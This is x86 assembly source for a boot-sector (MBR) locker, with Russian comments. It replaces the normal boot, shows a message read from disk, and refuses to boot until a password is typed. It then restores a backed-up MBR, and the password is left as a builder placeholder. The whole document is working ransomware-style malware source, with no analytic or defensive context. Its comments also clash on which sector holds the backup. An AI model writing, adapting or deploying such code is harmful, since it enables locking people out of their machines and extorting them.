BITS 16
ORG 0x7C00

start:
    cli
    cld
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00
    sti

    ; === НАСТРОЙКА ЭКРАНА ===
    mov ax, 0x0003
    int 0x10

    mov ah, 0x06
    mov al, 0
    mov bh, COLOR_BG
    mov cx, 0
    mov dx, 0x184F
    int 0x10

    ; === ЗАГРУЗКА ШРИФТА CP866 ===
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x1000
    mov ah, 0x02
    mov al, 8
    mov ch, 0
    mov cl, 3
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc load_error

    mov ax, 0x1100
    mov bx, 0x0100
    int 0x10

    ; === ЗАГРУЗКА И ВЫВОД ЗАГОЛОВКА ===
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x9000
    mov ah, 0x02
    mov al, 1
    mov ch, 0
    mov cl, 11
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc load_error

    mov si, 0x9000
    call print

    ; === ЗАГРУЗКА И ВЫВОД ТЕКСТА ===
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x9200
    mov ah, 0x02
    mov al, 1
    mov ch, 0
    mov cl, 12
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc load_error

    mov si, 0x9200
    call print

    ; === ПРИГЛАШЕНИЕ ПАРОЛЯ ===
    mov ah, 0x02
    mov bh, 0
    mov dh, 24
    mov dl, 0
    int 0x10

    mov si, msg_prompt
    call print

password_loop:
    call get_password
    call check_password
    cmp byte [password_ok], 1
    je restore_and_boot

    mov si, msg_wrong
    call print

    ; ВОЗВРАТ КУРСОРА
    mov ah, 0x02
    mov bh, 0
    mov dh, 24
    mov dl, 9
    int 0x10

    jmp password_loop

load_error:
    mov si, msg_error
    call print
    jmp hang

restore_and_boot:
    call restore_mbr
    int 0x19          ; ПЕРЕЗАГРУЗКА

; === ВОССТАНОВЛЕНИЕ MBR ===
restore_mbr:
    pusha
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7E00
    mov ah, 0x02
    mov al, 1
    mov ch, 0
    mov cl, 3          ; ЧИТАЕМ БЭКАП ИЗ СЕКТОРА 2 (LBA 2)
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc .error

    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7E00
    mov ah, 0x03
    mov al, 1
    mov ch, 0
    mov cl, 1          ; ПИШЕМ В СЕКТОР 0 (LBA 0)
    mov dh, 0
    mov dl, 0x80
    int 0x13
.error:
    popa
    ret

; === ПЕЧАТЬ СТРОКИ ===
print:
    lodsb
    or al, al
    jz .done
    mov ah, 0x0E
    mov bh, 0x00
    mov bl, COLOR_FG
    int 0x10
    jmp print
.done:
    ret

; === ВВОД ПАРОЛЯ ===
get_password:
    mov di, buffer
.loop:
    xor ax, ax
    int 0x16
    cmp al, 0x0D
    je .done
    cmp al, 0x08
    je .backspace
    cmp al, 0x7F
    je .backspace
    cmp di, buffer + 64
    je .loop
    stosb
    mov ah, 0x0E
    mov bh, 0x00
    mov bl, COLOR_FG
    mov al, [di - 1]
    int 0x10
    jmp .loop
.backspace:
    cmp di, buffer
    je .loop
    dec di
    mov ah, 0x0E
    mov bh, 0x00
    mov bl, COLOR_FG
    mov al, 0x08
    int 0x10
    mov al, ' '
    int 0x10
    mov al, 0x08
    int 0x10
    jmp .loop
.done:
    mov byte [di], 0
    mov ah, 0x0E
    mov bh, 0x00
    mov bl, COLOR_FG
    mov al, 0x0A
    int 0x10
    mov al, 0x0D
    int 0x10
    ret

; === ПРОВЕРКА ПАРОЛЯ ===
check_password:
    mov si, buffer
    mov di, password
.compare:
    lodsb
    or al, al
    jz .check_end
    cmp al, [di]
    jne .fail
    inc di
    jmp .compare
.check_end:
    cmp byte [di], 0
    jne .fail
    mov byte [password_ok], 1
.fail:
    ret

hang:
    cli
    hlt
    jmp hang

msg_prompt:
    db 'Password: ',0
msg_wrong:
    db 'Wrong password!',13,10,0
msg_error:
    db 'Load error!',0

password:
    db {PASSWORD_HEX}

buffer:
    times 64 db 0
password_ok:
    db 0

times 510 - ($ - start) db 0
dw 0xAA55
